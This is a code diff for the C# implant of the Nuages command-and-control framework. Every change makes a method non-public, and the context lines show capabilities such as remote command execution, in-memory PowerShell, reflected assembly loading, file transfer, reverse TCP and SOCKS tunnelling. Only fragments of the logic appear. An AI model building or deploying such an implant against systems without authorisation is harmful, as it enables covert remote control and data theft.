@@ -30,7 +30,7 @@ namespace NuagesSharpImplant
         private Random rnd;
         private Dictionary<string, Action<JsonObject>> do_job;
 
-        public string GetLocalIPv4()
+        string GetLocalIPv4()
         {
             var host = Dns.GetHostEntry(Dns.GetHostName());
             foreach (var ip in host.AddressList)
@@ -114,7 +114,7 @@ namespace NuagesSharpImplant
             this.handler = connector.getHandler();
         }
 
-        public void Register()
+        void Register()
         {
             while (!this.config.ContainsKey("id"))
             {
@@ -132,7 +132,7 @@ namespace NuagesSharpImplant
             return;
         }
         
-        public void Heartbeat() {
+        void Heartbeat() {
             this.jobs = this.connector.Heartbeat(this.config["id"]);
         }
 
@@ -148,7 +148,7 @@ namespace NuagesSharpImplant
         }
 
 
-        public void do_command(JsonObject job) {
+        void do_command(JsonObject job) {
             string jobId = job["_id"];
             string cmd = job["payload"]["options"]["cmd"];
             string path = ".";
@@ -175,7 +175,7 @@ namespace NuagesSharpImplant
 
         }
 
-        public void do_cd(JsonObject job)
+        void do_cd(JsonObject job)
         {
             string jobId = job["_id"];
             string dir = job["payload"]["options"]["dir"];
@@ -195,7 +195,7 @@ namespace NuagesSharpImplant
 
         }
 
-        public void do_configure(JsonObject job)
+        void do_configure(JsonObject job)
         {
             string jobId = job["_id"];
             JsonValue config = job["payload"]["options"]["config"];
@@ -231,7 +231,7 @@ namespace NuagesSharpImplant
         }
 
 
-        public NuagesC2Connection parse_handlers(string handlers)
+        NuagesC2Connection parse_handlers(string handlers)
         {
 
             string[] handler_args = handlers.Split('|');
@@ -284,7 +284,7 @@ namespace NuagesSharpImplant
         }
       
 
-        public void do_exit(JsonObject job)
+        void do_exit(JsonObject job)
         {
             string jobId = job["_id"];
             SubmitJobResult(jobId, "Bye Bye!", false);
@@ -292,7 +292,7 @@ namespace NuagesSharpImplant
 
         }
 
-        public void do_kill_job(JsonObject job)
+        void do_kill_job(JsonObject job)
         {
             string jobId = job["_id"];
             string target_jobId = job["payload"]["options"]["job_id"];
@@ -301,7 +301,7 @@ namespace NuagesSharpImplant
             SubmitJobResult(jobId, "Job Successfully Killed", false);
         }
 
-        public void do_download(JsonObject job)
+        void do_download(JsonObject job)
         {
             string jobId = job["_id"];
             string path = ".";
@@ -324,7 +324,7 @@ namespace NuagesSharpImplant
 
         }
 
-        public void do_upload(JsonObject job)
+        void do_upload(JsonObject job)
         {
             string jobId = job["_id"];
             string path = ".";
@@ -346,7 +346,7 @@ namespace NuagesSharpImplant
 
         }
 
-        public void do_posh_in_mem(JsonObject job)
+        void do_posh_in_mem(JsonObject job)
         {
             string jobId = job["_id"];
             string command = job["payload"]["options"]["command"];
@@ -384,7 +384,7 @@ namespace NuagesSharpImplant
 
         }
 
-        public void do_reflected_assembly(JsonObject job)
+        void do_reflected_assembly(JsonObject job)
         {
             string jobId = job["_id"];
             string arguments = job["payload"]["options"]["arguments"];
@@ -452,7 +452,7 @@ namespace NuagesSharpImplant
         }
 
 
-        public void do_interactive(JsonObject job)
+        void do_interactive(JsonObject job)
         {
             string jobId = job["_id"];
             string filename = job["payload"]["options"]["filename"];
@@ -521,7 +521,7 @@ namespace NuagesSharpImplant
         }
 
 
-        public void do_tcp_fwd(JsonObject job)
+        void do_tcp_fwd(JsonObject job)
         {
             string jobId = job["_id"];
             TcpClient tcpClient = new TcpClient();
@@ -535,7 +535,7 @@ namespace NuagesSharpImplant
 
         }
 
-        public void do_rev_tcp(JsonObject job) {
+        void do_rev_tcp(JsonObject job) {
             TcpListener server = new TcpListener(IPAddress.Parse(job["payload"]["options"]["bindIP"]), job["payload"]["options"]["bindPort"]);
             server.Start();
             while (true)
@@ -571,7 +571,7 @@ namespace NuagesSharpImplant
             }
         }
 
-        public void rev_tcp_thread(TcpClient client, string pipe_id) {
+        void rev_tcp_thread(TcpClient client, string pipe_id) {
             try
             {
                 try
@@ -593,7 +593,7 @@ namespace NuagesSharpImplant
         }
                 
 
-        public void do_socks(JsonObject job)
+        void do_socks(JsonObject job)
         {
             string jobId = job["_id"];
             TcpClient tcpClient = new TcpClient();
@@ -736,7 +736,7 @@ namespace NuagesSharpImplant
 
 
 
-        public void ExecuteJob(JsonObject job)
+        void ExecuteJob(JsonObject job)
         {
             try
             {
